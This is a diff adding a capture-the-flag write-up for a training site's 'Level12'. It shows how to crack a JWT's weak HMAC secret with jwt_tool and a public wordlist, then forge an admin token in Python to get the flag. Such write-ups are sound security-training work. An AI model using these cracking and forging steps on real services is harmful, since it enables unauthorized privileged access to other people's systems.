@@ -230,7 +230,55 @@ you wil get : "/rqp2yOxi"
 ```
 
 
+- ### Level12
 
+```text
+1.This level uses websocket again, send `help` to get available actions:
+- issue_token
+- auth
+- users
+
+2.Send an issue_token to get a jwt token, the payload is :
+
+{
+  "user": "anonymous",
+  "iat": 1709169921,
+  "exp": 1709173521
+}
+
+3.Try to crack it with `jwt_tool.py` and this wordlist:
+https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list
+using this command :
+```
+
+```bash
+python3 jwt_tool.py 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYW5vbnltb3VzIiwiaWF0IjoxNzA5MTY5OTIxLCJleHAiOjE3MDkxNzM1MjF9.506xdFYqhL1Vq7bFfSjNtVkTmr9Lip5xF1EVXOAouUg' -C -d jwt.secrets.list
+```
+
+```text
+the key is : `supersecretkey`
+4.Now we need to generate a new jwt using this key and user `admin`
+i wrote a python code :
+```
+
+```python
+import jwt
+
+payload_data = {
+  "user": "admin"
+}
+encoded_token = jwt.encode(payload_data, 'supersecretkey', algorithm="HS256")
+print(encoded_token)
+```
+
+```text
+5.Now send this token to this url : https://talent.voorivex.academy/rNNVU329/
+in Authorization header like this : `Authorization: bearer YOUR_TOKEN_HERE`
+
+6.It gives you the flag : "/hrBlNawD"
+
+7.Go to : https://talent.voorivex.academy/hrBlNawD/
+```
 
 
 
